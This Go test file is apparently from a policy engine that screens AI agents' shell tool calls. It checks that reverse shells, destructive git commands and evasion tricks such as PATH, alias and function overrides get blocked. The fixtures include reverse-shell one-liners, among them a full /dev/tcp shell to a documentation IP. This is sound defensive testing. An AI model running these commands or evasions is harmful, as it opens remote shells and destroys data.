// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package policy

import (
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/config"
)

func TestShellCommandBoundaries(t *testing.T) {
	pc := defaultConfigWithIncomplete(t, config.ActionBlock)
	commands := map[string][]string{
		"Destructive Git Operation": {"push -f", "reset --hard", "clean -fd"},
		"Reverse Shell":             {"bash -i >&", "bash -xi >&", "mkfifo channel", "nc -e sh", "ncat -e sh", "netcat host -e sh", "nc host -c sh", "ncat --sh-exec sh", "netcat --lua-exec file"},
	}
	for name, commands := range commands {
		for _, command := range commands {
			for _, prefix := range []string{"", " ", "\t", "\n", ";", "|", "&", "(", ")", "<", ">", "`", "$(", "\"", "'", "/usr/bin/", "./", "x="} {
				t.Run(name+"/"+prefix+command, func(t *testing.T) {
					pattern := regexp.MustCompile(shippedShellPatterns[name])
					if !pattern.MatchString(prefix + command) {
						t.Fatal("missing raw pattern match")
					}
					v := pc.CheckToolCall("bash", []string{prefix + command})
					if !slices.Contains(v.Rules, name) || v.Action != config.ActionBlock {
						t.Fatalf("missing rule: %+v", v)
					}
				})
			}
			for _, prefix := range []string{"a", "_", "1", ":", "stack::", "func", "sync", "async", "-", "."} {
				t.Run(name+"/nonword/"+prefix+command, func(t *testing.T) {
					if regexp.MustCompile(shippedShellPatterns[name]).MatchString(prefix + command) {
						t.Fatal("substring match")
					}
					if v := pc.CheckToolCall("bash", []string{prefix + command}); slices.Contains(v.Rules, name) {
						t.Fatalf("substring verdict: %+v", v)
					}
				})
			}
		}
	}
	for _, command := range []string{"/usr/bin/git push -f", "./git reset --hard", "git -C workspace clean -fd"} {
		if v := pc.CheckToolCall("bash", []string{command}); !slices.Contains(v.Rules, "Destructive Git Operation") {
			t.Fatalf("%s: %+v", command, v)
		}
	}
}

func TestShellCleanPreview(t *testing.T) {
	pc := defaultConfigWithIncomplete(t, config.ActionBlock)
	allow := []string{
		"git clean -fdn", "git clean -f -n -d -x", "git clean --dry-run -fdx", "git clean --dry -fd",
		"git clean -nfde pattern", "git clean -fdn --exclude=pattern", "git clean -fdn -- '*.tmp'", "git clean -fdn '~'",
		"git clean -fdn; git clean -dnf", "cd workspace; git clean -fdn", "cd /srv/work && git clean -fdn",
		"cd 'some workspace'; git clean -fdn", "pushd workspace; git clean -fdn; popd", "cd; git clean -fdn",
		"cd workspace; build; preview() { git clean -fdn; }; preview; git status --short",
		"preview() ( git clean -fdn ); preview", "CDPATH=/srv/work; git clean -fdn",
	}
	for _, command := range allow {
		t.Run(command, func(t *testing.T) {
			words, ok := shellProofWords(command)
			if !ok {
				t.Fatal("missing word proof")
			}
			if _, ok = shellCleanPreviews(command, words); !ok {
				t.Fatal("missing preview proof")
			}
			if v := pc.CheckShellCommand(command, nil); v.Matched {
				t.Fatalf("preview matched: %+v", v)
			}
		})
	}
	deny := []string{
		"git clean -fd", "git clean -fdn; git clean -fd", "git clean -fdn --no-dry-run", "git clean --no-dry-run -fdn",
		"git clean -fd -- -n", "git clean -fde -n", "git clean -fd --exclude -n", "git clean -fdn --unknown",
		"git clean -fdn {--no-dry-run,untracked.txt}", "git clean -fdn *", "git clean -fdn ~", "git clean -fdn file?", "git clean -fdn [ab]",
		"git clean -fdn \"$target\"", "git clean -fdn $(target)", "git clean -fdn `target`",
		`git clean -fdn a\ b`, "git clean -fdn #comment", "git clean -fdn 'notes",
		"PATH=./tools:$PATH; git clean -fdn", "PATH+=./tools; git clean -fdn", "export PATH; git clean -fdn",
		"declare PATH; git clean -fdn", "readonly PATH; git clean -fdn", "local PATH; git clean -fdn",
		"printf -v PATH '%s' ./tools; git clean -fdn", "read PATH; git clean -fdn", "set -a; PATH=./tools; git clean -fdn",
		"enable -f tool git; git clean -fdn", "hash -p ./tools/git git; git clean -fdn", "alias git=tool; git clean -fdn",
		"git() { tool; }; git clean -fdn", "git() ( tool ); git clean -fdn", "git() if true; then tool; fi; git clean -fdn",
		"function git { tool; }; git clean -fdn", "function git() ( tool ); git clean -fdn",
		"BASH_ENV=setup; git clean -fdn", "ENV=setup; git clean -fdn", "source setup; git clean -fdn", ". setup; git clean -fdn",
		"eval setup; git clean -fdn", "exec git clean -fdn", "command_not_found_handle() { tool; }; git clean -fdn",
		"printf -v label '%s' sample; git clean -fdn", "printf '%n' count; git clean -fdn",
		"trap handler EXIT; git clean -fdn", "unset label; git clean -fdn", "let count=1; git clean -fdn",
		"git clean -fdn; 'git clean -fd'", "git clean -fdn; 'git clean' -fd",
		"CDPATH=./tools; cd workspace; git clean -fdn", "cd \"$target\"; git clean -fdn", "cd $(target); git clean -fdn", "cd -; git clean -fdn",
		"git clean -fdn; bash -c 'git clean -fd'", "git clean -fdn; git reset --hard", "git clean -fdn; git push -f",
	}
	for _, command := range deny {
		t.Run(command, func(t *testing.T) {
			if v := pc.CheckShellCommand(command, nil); !v.Matched || v.Action != config.ActionBlock {
				t.Fatalf("missing conservative block: %+v", v)
			}
		})
	}
}

func TestShellCleanVisibleOverrides(t *testing.T) {
	pc := defaultConfigWithIncomplete(t, config.ActionWarn)
	// bash(1) Quoting permits adjacent quoted and unquoted word parts.
	// Unsupported escapes and expansions must withhold the preview proof.
	spellings := []struct {
		name string
		word func(string) string
	}{
		{"plain", func(s string) string { return s }},
		{"empty single", func(s string) string { return s[:1] + "''" + s[1:] }},
		{"empty double", func(s string) string { return s[:1] + `""` + s[1:] }},
		{"single part", func(s string) string { return s[:1] + "'" + s[1:min(2, len(s))] + "'" + s[min(2, len(s)):] }},
		{"double part", func(s string) string { return s[:1] + `"` + s[1:min(2, len(s))] + `"` + s[min(2, len(s)):] }},
		{"single word", func(s string) string { return "'" + s + "'" }},
		{"double word", func(s string) string { return `"` + s + `"` }},
		{"backslash", func(s string) string { return `\` + s }},
		{"ansi word", func(s string) string { return "$'" + s + "'" }},
		{"ansi hex part", func(s string) string { return "$'\\x" + strconv.FormatInt(int64(s[0]), 16) + "'" + s[1:] }},
		{"parameter part", func(s string) string { return s[:1] + "${x}" + s[1:] }},
	}
	for _, spelling := range spellings {
		for _, variable := range []string{"PATH", "BASH_ENV", "ENV", "CDPATH"} {
			word := spelling.word(variable)
			for _, prefix := range []string{
				word + "=./tools", word + "+=./tools", "export " + word + "=./tools",
				"declare " + word + "=./tools", "typeset " + word + "=./tools", "readonly " + word + "=./tools",
				"local " + word + "=./tools", "export " + word, "read " + word,
				"printf -v " + word + " '%s' ./tools", "unset " + word,
			} {
				t.Run(spelling.name+"/"+prefix, func(t *testing.T) {
					command := prefix + "; "
					if variable == "CDPATH" {
						command += "cd workspace; "
					}
					checkShellOverride(t, pc, command+"git clean -fdn")
				})
			}
		}
		for _, override := range []struct{ word, tail string }{
			{"enable", " -f tool git"},
			{"hash", " -p ./tools/git git"},
			{"alias", " git=tool"},
			{"unalias", " git"},
			{"source", " setup"},
			{".", " setup"},
			{"eval", " setup"},
			{"exec", " tool"},
			{"command_not_found_handle", "() { tool; }"},
			{"git", "() { tool; }"},
			{"git", "() ( tool )"},
			{"git", "() if true; then tool; fi"},
			{"trap", " handler EXIT"},
			{"unset", " label"},
			{"let", " count=1"},
		} {
			word := spelling.word(override.word)
			t.Run(spelling.name+"/"+word+override.tail, func(t *testing.T) {
				checkShellOverride(t, pc, word+override.tail+"; git clean -fdn")
			})
		}
		t.Run(spelling.name+"/function keyword", func(t *testing.T) {
			checkShellOverride(t, pc, "function "+spelling.word("git")+" { tool; }; git clean -fdn")
		})
	}
}

func checkShellOverride(t *testing.T, pc *Config, command string) {
	t.Helper()
	if p := proveShellRules(command); p != nil && (p.clean != nil || p.data != nil) {
		t.Fatal("visible override retained a shell exception")
	}
	if v := pc.CheckShellCommand(command, nil); !slices.Contains(v.Rules, "Destructive Git Operation") || v.Action != config.ActionBlock {
		t.Fatalf("visible override lost whole-script blocking: %+v", v)
	}
}

func TestShellCleanQuotedProgram(t *testing.T) {
	for _, command := range []string{"git clean -fdn; 'git clean -fd'", "git clean -fdn; 'git clean' -fd"} {
		words, ok := shellProofWords(command)
		if !ok {
			t.Fatal("literal words were not read")
		}
		if _, proved := shellCleanPreviews(command, words); proved {
			t.Fatal("quoted program retained preview proof")
		}
	}
}

func TestShellWholeScriptHandoffs(t *testing.T) {
	pc := defaultConfigWithIncomplete(t, config.ActionBlock)
	commands := []string{
		"git clean -fdn {--no-dry-run,untracked.txt}",
		`perform() ( git reset "$@"; ); perform --hard`,
		`printf -v mode '%s' --hard; git reset "$mode"`,
		"target=flags\nprintf '%s\\n' --hard > \"$target\"\nxargs git reset < flags",
		`flags() { printf '%s' --hard; }; git reset "$(flags)"`,
		"PATH=./tools:$PATH; git clean -fdn",
		"printf '%s\\n' --hard |\nxargs git reset",
		"printf '%s\\n' --hard | xargs git reset",
		"echo 'git reset --hard' | sh", "echo 'git reset --hard' > program.sh; sh program.sh",
		"exec 3<>/dev/tcp/192.0.2.1/4444\nbash -i <&3 >&3 2>&3",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			if v := pc.CheckShellCommand(command, nil); !v.Matched || v.Action != config.ActionBlock {
				t.Fatalf("handoff matched no block: %+v", v)
			}
		})
	}
}

func TestShellProofRuleScope(t *testing.T) {
	pc := defaultConfigWithIncomplete(t, config.ActionBlock)
	command := `echo 'git reset --hard'`
	if v := pc.CheckToolCall("bash", []string{command}); !v.Matched {
		t.Fatal("generic tool gained exception")
	}
	pc.Rules = append(pc.Rules, &CompiledRule{Name: "custom", ToolPattern: regexp.MustCompile("bash"), ArgPattern: regexp.MustCompile("reset"), Action: config.ActionBlock})
	if v := pc.CheckShellCommand(command, nil); !slices.Contains(v.Rules, "custom") {
		t.Fatalf("custom rule lost text: %+v", v)
	}
	if v := (*Config)(nil).CheckShellCommand(command, nil); v.Matched {
		t.Fatal(v)
	}
}

func TestShellPatternCopies(t *testing.T) {
	root := filepath.Join("..", "..", "..")
	var files []string
	for _, glob := range []string{"configs/*.yaml", "examples/*/pipelock.yaml"} {
		paths, err := filepath.Glob(filepath.Join(root, glob))
		if err != nil {
			t.Fatal(err)
		}
		files = append(files, paths...)
	}
	counts := map[string]int{}
	for _, file := range files {
		content, err := os.ReadFile(filepath.Clean(file))
		if err != nil {
			t.Fatal(err)
		}
		cfg, err := config.Load(file)
		if err != nil {
			t.Fatal(err)
		}
		for _, rule := range cfg.MCPToolPolicy.Rules {
			want, ok := shippedShellPatterns[rule.Name]
			if !ok {
				continue
			}
			if rule.ArgPattern != want {
				t.Errorf("%s/%s differs", file, rule.Name)
			}
			if !strings.Contains(string(content), want) {
				t.Errorf("%s missing literal pattern", file)
			}
			counts[rule.Name]++
		}
	}
	for name := range shippedShellPatterns {
		if counts[name] < 8 {
			t.Fatalf("%s: only %d copies checked", name, counts[name])
		}
	}
}
